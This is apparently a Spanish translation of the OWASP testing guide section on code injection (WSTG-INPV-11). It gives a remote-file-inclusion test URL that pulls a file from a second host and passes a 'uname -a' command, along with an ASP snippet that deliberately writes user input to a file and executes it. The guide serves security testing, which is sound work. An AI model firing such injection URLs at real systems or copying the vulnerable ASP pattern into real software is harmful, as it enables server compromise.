# Pruebas de inyección de código

|ID          |
|------------|
|WSTG-INPV-11|

## Resumen

Esta sección describe cómo un evaluador puede verificar si es posible ingresar código como entrada en una página web y que sea ejecutado por el servidor web.

En las pruebas de [inyección de código](https://owasp.org/www-community/attacks/Code_Injection), un evaluador envía entrada que es procesada por el servidor web como código dinámico o como un archivo incluido. Estas pruebas pueden dirigirse a varios motores de scripting del lado del servidor, por ejemplo, ASP o PHP. Se deben emplear validación de entrada adecuada y prácticas de codificación segura para protegerse contra estos ataques.

## Objetivos de la prueba

- Identificar puntos de inyección donde se puede inyectar código en la aplicación.
- Evaluar la gravedad de la inyección.

## Cómo probar

### Pruebas de caja negra

#### Pruebas de vulnerabilidades de inyección PHP

Usando la cadena de consulta, el evaluador puede inyectar código (en este ejemplo, una URL maliciosa) para que sea procesado como parte del archivo incluido:

`https://www.example.com/uptime.php?pin=https://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a`

> La URL maliciosa es aceptada como parámetro para la página PHP, que posteriormente usará el valor en un archivo incluido.

### Pruebas de caja gris

#### Pruebas de vulnerabilidades de inyección de código ASP

Examine el código ASP en busca de entrada de usuario utilizada en funciones de ejecución. ¿Puede el usuario ingresar comandos en el campo de entrada Data? Aquí, el código ASP guardará la entrada en un archivo y luego lo ejecutará:

```asp
<%
If not isEmpty(Request( "Data" ) ) Then
Dim fso, f
'User input Data is written to a file named data.txt
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
f.Write Request("Data") & vbCrLf
f.close
Set f = nothing
Set fso = Nothing

'Data.txt is executed
Server.Execute( "data.txt" )

Else
%>

<form>
<input name="Data" /><input type="submit" name="Enter Data" />

</form>
<%
End If
%>)))
```

### Referencias

- [Insecure.org](https://insecure.org/)
- [Wikipedia](https://www.wikipedia.org)
- [Revisando código para inyección de OS](https://wiki.owasp.org/index.php/OS_Injection)